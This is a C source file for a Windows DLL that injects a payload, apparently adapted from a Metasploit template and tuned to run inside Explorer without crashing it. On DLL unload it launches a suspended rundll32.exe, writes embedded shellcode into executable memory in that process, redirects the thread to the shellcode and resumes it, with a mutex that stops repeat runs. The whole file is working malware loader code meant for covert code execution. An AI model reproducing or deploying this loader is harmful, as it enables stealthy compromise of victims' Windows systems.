// Based on https://github.com/rapid7/metasploit-framework/tree/cac890a797d0d770260074dfe703eb5cfb63bd46/data/templates/src/pe/dll
// - removed ExitThread(0) to prevent an Explorer crash
// - added Mutex to prevent invoking payload multiple times
//   timeout set to 2.5s to prevent hanging of Explorer
#include <windows.h>
#include "template.h"

void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

void ExecutePayload(void);

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		break;

        case DLL_PROCESS_DETACH:
		ExecutePayload();
		break;

        case DLL_THREAD_ATTACH:
		break;

        case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}

void ExecutePayload(void)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	LPVOID ep;
	HANDLE hMutex = CreateMutex(NULL, TRUE, "MsfMutex");

	if(hMutex == NULL)
	{
		return;
	}
/*
	if(CreateEvent(NULL, TRUE, FALSE, "MsfEvent") == NULL)
		return;

	if(GetLastError() == ERROR_ALREADY_EXISTS)
		return;
*/

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

		ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

#ifdef _WIN64
		ctx.Rip = (DWORD64)ep;
#else
		ctx.Eip = (DWORD)ep;
#endif

		SetThreadContext(pi.hThread,&ctx);

		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
		WaitForSingleObject(pi.hProcess, 2500);
//		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
	}

	CloseHandle(hMutex);
}

